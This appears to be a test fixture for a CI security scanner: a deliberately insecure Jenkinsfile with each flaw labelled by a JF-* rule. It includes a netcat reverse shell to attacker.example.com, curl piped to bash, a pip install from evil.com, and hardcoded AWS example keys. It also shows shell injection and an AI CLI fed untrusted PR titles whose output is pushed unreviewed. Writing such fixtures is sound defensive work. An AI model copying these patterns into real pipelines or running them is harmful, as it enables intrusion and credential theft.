// Realistic insecure Jenkinsfile exhibiting every JF-* failure mode.
@Library('shared-pipeline@main') _

pipeline {
    agent {
        // Floating tag — JF-009. Also `agent any` semantics handled
        // separately via the inline `any` directive below for JF-003.
        docker { image 'maven:latest' }
    }

    // JF-034 — password() build parameter stores the value in
    // build.xml and surfaces it on the parameters page.
    parameters {
        password(name: 'DEPLOY_TOKEN', defaultValue: '', description: 'prod token')
        string(name: 'BUILD_TARGET', defaultValue: 'all', description: 'make target')
    }

    environment {
        DEBUG_AWS_KEY = "AKIAZ3MHALF2TESTHIJK"
        // JF-010 — long-lived AWS keys exposed via env block.
        AWS_ACCESS_KEY_ID = "AKIAZ3MHALF2TESTHIJK"
        AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    }

    stages {
        stage('Bootstrap') {
            agent any
            steps {
                // JF-012 — dynamic load.
                script {
                    def helpers = load 'ci/helpers.groovy'
                }
            }
        }

        stage('Build') {
            steps {
                sh "echo Building branch ${env.BRANCH_NAME}"
                // JF-036 — build parameter spliced into a double-quoted sh.
                sh "make ${params.BUILD_TARGET}"
                sh "make build"
                // JF-037 — untrusted PR context fed into an agentic AI CLI prompt.
                sh "claude -p 'Triage this PR titled ${env.CHANGE_TITLE}'"
                // JF-038 — agentic CLI output (claude above) pushed straight
                // to a branch in the same pipeline, with no review gate.
                sh "git push origin HEAD"
                // JF-013 -- ingests build output from another job
                // with no integrity check.
                copyArtifacts(projectName: 'platform-build', filter: 'dist/*')
                sh './dist/install.sh'
                // JF-027 — archiveArtifacts without fingerprint: true.
                archiveArtifacts artifacts: 'dist/*.jar'
            }
        }

        // JF-025 — Kubernetes agent pod template with privileged mode
        // and a hostPath mount (both escape vectors).
        stage('Package on K8s') {
            agent {
                kubernetes {
                    yaml '''
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: packager
    image: debian:bullseye
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
'''
                }
            }
            steps {
                sh 'make package'
            }
        }

        stage('Deploy to production') {
            // JF-014 — agent label without ephemeral marker.
            // JF-032 — label interpolates ${env.BRANCH_NAME}, so the
            // pusher picks which build pool the deploy lands on.
            agent { label "build-pool-${env.BRANCH_NAME}" }
            steps {
                // JF-004 — binds long-lived AWS keys, not an IAM role.
                // JF-033 — Groovy ${AWS_ACCESS_KEY_ID} interpolation
                // bakes the literal value into the shell command before
                // the Jenkins masker sees it, leaking the secret to set -x.
                withCredentials([string(credentialsId: 'aws-prod-key',
                                        variable: 'AWS_ACCESS_KEY_ID')]) {
                    sh "aws s3 cp dist/ s3://prod-bucket/ --key ${AWS_ACCESS_KEY_ID}"
                }
                // JF-035 — httpRequest disables SSL verification.
                httpRequest url: 'https://internal.example.com/notify',
                            ignoreSslErrors: true
            }
        }

        // JF-024 — input step without a submitter restriction.
        // JF-026 — fire-and-forget downstream trigger.
        stage('Release to customers') {
            steps {
                input message: 'Promote to prod?'
                build job: 'downstream-notify', wait: false, propagate: false
            }
        }

        // JF-029 — evidence of malicious activity: shell-history erasure
        // plus a netcat reverse-shell primitive.
        stage('Cleanup') {
            steps {
                sh 'history -c && unset HISTFILE'
                sh 'nc attacker.example.com 4444 -e /bin/sh'
            }
        }

        // JF-016 — curl piped to shell.
        // JF-017 — docker run --privileged.
        // JF-018 — pip install from insecure source.
        // JF-019 — Groovy sandbox escape.
        // JF-020 — no vulnerability scanning step.
        stage('Insecure Setup') {
            steps {
                sh 'curl https://example.com/setup.sh | bash'
                sh 'docker run --privileged myimage'
                sh 'pip install --index-url http://evil.com/simple/ pkg'
                // JF-021: package install without lockfile enforcement.
                sh 'npm install'
                // JF-022: dependency update bypasses lockfile pins.
                sh 'pip install --upgrade requests'
                // JF-023: TLS verification bypass.
                sh 'git config --global http.sslVerify false'
                // JF-030: dangerous shell idiom — eval re-parses the value as shell.
                sh 'eval "$BUILD_CMD"'
                // JF-031: pip install from an unpinned git URL.
                sh 'pip install git+https://example.com/internal/helper.git'
                // JF-039: model loaded with trust_remote_code (RCE on the agent).
                sh 'huggingface-cli download acme/llm --trust-remote-code'
                script {
                    def proc = Runtime.getRuntime().exec("id")
                }
            }
        }
    }
}
